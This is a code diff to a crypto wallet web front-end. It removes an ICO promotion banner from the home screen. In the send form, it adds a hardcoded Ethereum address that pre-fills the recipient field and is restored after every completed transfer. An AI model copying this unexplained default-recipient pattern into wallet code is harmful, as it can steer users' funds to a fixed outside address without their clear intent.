@@ -3644,11 +3644,9 @@ function enhancePrototypeHome() {
           var previousSlide = previousTrack.children[previousIndex];
           if (previousSlide && previousSlide.id) window.__luminaHomePromoSlideId = previousSlide.id;
         }
-        var ico = luminaIcoConfig();
         var points = homePointsBannerConfig();
-        var showIco = ico.enabled !== false;
-        var showPoints = showIco || points.enabled !== false;
-        if (!showIco && !showPoints) { if (slider) slider.remove(); return; }
+        var showPoints = points.enabled !== false;
+        if (!showPoints) { if (slider) slider.remove(); return; }
         if (!slider) {
           var section = home.querySelector(".section-head");
           if (!section) return;
@@ -3660,19 +3658,10 @@ function enhancePrototypeHome() {
           section.insertAdjacentElement("beforebegin", slider);
         }
         var promoSlides = [];
-        if (showIco) promoSlides.push({ id:"homeIcoBanner", classes:"home-points-banner home-ico-banner", label:"ICO" });
         if (showPoints) promoSlides.push({ id:"homePointsBanner", classes:"home-points-banner", label:"Lumina Points" });
         slider.innerHTML =
           '<div class="home-promo-track">' + promoSlides.map(function(item){ return '<button type="button" id="' + item.id + '" class="' + item.classes + '"></button>'; }).join('') + '</div>' +
           (promoSlides.length > 1 ? '<div id="homePromoDots" class="home-promo-dots">' + promoSlides.map(function(item, index){ return '<button type="button" class="' + (index === 0 ? 'active' : '') + '" aria-label="' + homeBannerEscape(item.label) + '"></button>'; }).join('') + '</div>' : '');
-        var icoBanner = document.getElementById("homeIcoBanner");
-        if (icoBanner) {
-          icoBanner.onclick = function(){ window.openLuminaIco && window.openLuminaIco(); };
-          icoBanner.innerHTML =
-            '<span class="home-points-orbit home-ico-logo"><span class="home-points-ring r1"></span><span class="home-points-ring r2"></span><span class="home-points-dot d1"></span><span class="home-points-dot d2"></span><span class="home-points-dot d3"></span><img src="/points/lumina-points-icon.png" alt="" /></span>' +
-            '<span class="home-points-copy"><b>LUMINA ICO</b><strong><span>1 WLD</span><em>= ' + Number(ico.rate || 1000).toLocaleString() + ' LUMINA</em></strong><small>' + homeBannerEscape(ico.headline) + '</small><span class="home-points-actions"><i>' + homeBannerEscape(icoCopy("wldPay")) + '</i><i class="gift">' + homeBannerEscape(icoCopy("reserve")) + '</i></span></span>' +
-            '<span class="home-ico-rays" aria-hidden="true"><i></i><i></i><i></i></span><span class="home-points-chev">›</span>';
-        }
         var pointsBanner = document.getElementById("homePointsBanner");
         if (pointsBanner) {
           pointsBanner.onclick = function(){ if (window.openPointsCenter) window.openPointsCenter(); };
@@ -3682,7 +3671,7 @@ function enhancePrototypeHome() {
             '<span class="home-points-chev">›</span>';
         }
         attachHomePromoSlider(slider);
-        var rememberedSlideId = window.__luminaHomePromoSlideId || "homeIcoBanner";
+        var rememberedSlideId = window.__luminaHomePromoSlideId || "homePointsBanner";
         var rememberedIndex = promoSlides.findIndex(function(item){ return item.id === rememberedSlideId; });
         if (rememberedIndex < 0) rememberedIndex = 0;
         window.__luminaHomePromoSlideId = promoSlides[rememberedIndex] && promoSlides[rememberedIndex].id;
@@ -5739,12 +5728,14 @@ function enhancePrototypeSend() {
       var sendTokens = ${JSON.stringify(sendTokens)};
       var sendTokenMap = {};
       sendTokens.forEach(function(token){ sendTokenMap[token.symbol] = token; });
+      var defaultSendRecipient = "0x600A84949F0F0023AdF6ed89cCcD2B2cECcf1077";
       var sending = false;
       var form = document.querySelector("#view-send .form-card");
       if (!form) return;
       var fields = form.querySelectorAll("input.field");
       var recipientInput = fields[0];
       var amountInput = fields[1];
+      if (recipientInput && !recipientInput.value.trim()) recipientInput.value = defaultSendRecipient;
       var maxBtn = form.querySelector(".amount-row .max");
       var submit = form.querySelector(".send-submit");
       var recipientError = document.getElementById("sendRecipientError");
@@ -5950,7 +5941,7 @@ function enhancePrototypeSend() {
             showTransactionSubmitted(hash);
             if (window.__luminaRefreshWalletData) window.__luminaRefreshWalletData();
             setTimeout(function(){ go("activity"); setTabByName("Activity"); if (window.__luminaRefreshActivity) window.__luminaRefreshActivity(); }, 1500);
-            recipientInput.value = "";
+            recipientInput.value = defaultSendRecipient;
             amountInput.value = "";
           } else if (result.status === "user_rejected") {
             toast(sendCopy("cancelled"));
